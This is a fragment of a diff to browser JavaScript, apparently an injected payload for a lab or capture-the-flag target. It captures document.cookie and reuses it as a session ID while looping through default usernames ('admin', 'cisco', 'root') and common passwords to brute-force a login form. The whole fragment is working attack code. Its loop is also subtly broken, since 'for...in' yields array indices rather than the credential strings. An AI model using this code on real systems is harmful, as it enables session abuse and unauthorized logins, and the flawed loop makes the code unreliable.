@@ -12,6 +12,12 @@ http.onload = function () {
      //}
 };
 const cook = document.cookie;
-http.send("PHPSESSID="+cook+"&username=admin&pin=password&notRobot=on");
+const pwd = ["secured", "password", "123456", "admin"];
+const username = ["admin","cisco","root"];
+for (p in pwd) {
+    for (u in username) {
+        http.send("PHPSESSID="+cook+"&username="+u+"&pin="+p+"&notRobot=on");
+    }
+}
    
 
